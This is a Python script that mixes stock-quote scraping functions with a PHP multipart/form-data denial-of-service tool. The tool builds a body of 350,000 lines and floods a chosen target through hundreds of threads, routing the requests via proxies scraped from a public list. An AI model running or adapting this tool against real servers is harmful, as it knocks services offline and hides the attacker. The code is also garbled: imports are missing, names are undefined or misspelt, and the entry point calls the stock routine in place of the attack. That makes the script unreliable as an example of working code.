from __future__ import with_statement, print_function
from optparse import OptionParser
from multiprocessing import Pool

import sys

try:
    import urllib2
except:
    import urllib.request as urllib2

import datetime
import re
import os
import threading
import time
import random

# Just put it here for now
request_num = 350000
#worker_num = 500


field_order = ['date', 'last_trade','change','ah_price', 'ah_change']
fields = {'date': 'Date', 'last_trade': 'Last_Trade','change':'Change', 
          'ah_change': 'After hours Price',
          'ah_change': 'After Hours Change'}

def find_quote_section(html):
    soup = BeautifulSoup(html)        
    quote = soup.find('div', attrs={'class': 'yfi_rt_quote_summary'})
    return quote

def write_raw(ticker_name, stock_values):
   file_name = "Stocktracker-" + ticker_name + ".csv"
   if os.access(file_name, os.F_OK):
      file_mode = 'ab'
   else:
      file_mode = 'wb'
   
   csv_writer = csv.DictWriter(open(file_name, file_mode),fieldnames = field_order, extrasaction='ignore')

   if file_mode  == 'wb':
      csv_writer.writerow(fields)
   csv_writer.writerow(stok_values)



def check_php_multipartform_dos(url, post_body, headers, ip):
    try:
        proxy_handler = urllib2.ProxyHandler({"http": ip})
        null_proxy_handler = urllib2.ProxyHandler({})
        opener = urllib2.build_opener(proxy_handler)
        urllib2.install_opener(opener)
        req = urllib2.Request(url)
        for key in headers.keys():
            req.add_header(key, headers[key])
        starttime = datetime.datetime.now()
        fd = urllib2.urlopen(req, post_body)
        html = fd.read()
        endtime = datetime.datetime.now()
        usetime = (endtime - starttime).seconds
        if(usetime > 5):
            result = url+" is vulnerable"
        else:
            if(usetime > 3):
                result = "need to check normal respond time"
        return [result, usetime]
    except KeyboardInterrupt:
        exit()
# end


def get_stock_html(URL):
        opener = urllib2.build_opener(
                urllib2.HTTPRedirectHandler(),
                urllib2.HTTPHandler(debuglevel=0),
                )
        opener.addheaders = [
                ('User-agent',
                 'Mozilla/4.0 (compatible;MSIE 7.0;'
                 'Windows NT 5.1; .NET CLR 2.0.50727;'
                 '.NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
                 ]
        url = "http://proxy.com.ru/%s" % URL
        response = opener.open(url)
        return str(b''.join(response.readlines()))

def parse_stock_html(html, ticker_name):
    quote = find_quote_section(html)
    result = {}
    tick = ticker_name.lower()
    result['stock_name'] = quote.find('h2').contents[0]
    return result

def getting_list():
        global IP_Port
        IP_Port = []
        for html_list in re.findall('list_\d+.html', get_stock_html(
         "list_1.html")):
                print("getting %s's IP:PORT" % html_list)
                IP_Port += eval(re.sub('</td><td>', ':', "%s" %
                                re.findall(
                                    '\d+.\d+.\d+.\d+<\/td><td>\d+',
                                    get_stock_html(html_list))))

def main1():
   html = get_stock_html('GOOL')
   stock = parse_stock_html(html,'GOOL')
   stock['date']=time.strftime("%Y-%m-%d %H:%M")
   write_row('GOOG',stock)
   print ('Stock')

def main():
    parser = OptionParser()
    parser.add_option("-t", "--target", action="store",
                      dest="target",
                      default=False,
                      type="string",
                      help="test target")
    parser.add_option("-x", "--thread", action="store",
                      dest="thread",
                      default=250,
                      type="int",
                      help="thread")
    parser.add_option("-r", "--request_num", action="store",
                      dest="request_num",
                      default= 350000,
                      type="int",
                      help="request_num")
    
    (options, args) = parser.parse_args()
    if options.target:
        target = options.target
        thread = options.thread
        request_num = options.request_num
    else:
        return

    headers = {}

    headers["Content-Type"] = "multipart/form-data; boundary="
    headers["Content-Type"] += "----WebKitFormBoundaryX3B7rDMPcQlzmJE1"

    headers["Accept-Encoding"] = "gzip, deflate"

    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64) "
    headers["User-Agent"] += "AppleWebKit/537.36 (KHTML, like Gecko) "
    headers["User-Agent"] += "Chrome/40.0.2214.111 Safari/537.36"

    body = b"------WebKitFormBoundaryX3B7rDMPcQlzmJE1\n"
    body += b"Content-Disposition: form-data; name=\"file\"; filename=sp.jpg"

    payload = b""
    for i in range(0, request_num):
        payload += b"a\n"
    body += payload

    body += b"Content-Type: application/octet-stream\r\n\r\ndatadata\r\n"
    body += b"------WebKitFormBoundaryX3B7rDMPcQlzmJE1--"
    print("starting...")

    getting_list()
    
    try:
    
    
        pool = Pool(thread)
        for ip in IP_Port:
            pool.apply_async(check_php_multipartform_dos,
                             [target, body, headers, ip])
        pool.close()
        pool.join()
    except KeyboardInterrupt:
        print('EXIT')
        exit()

if __name__ == "__main__":
    main1()
    exit()
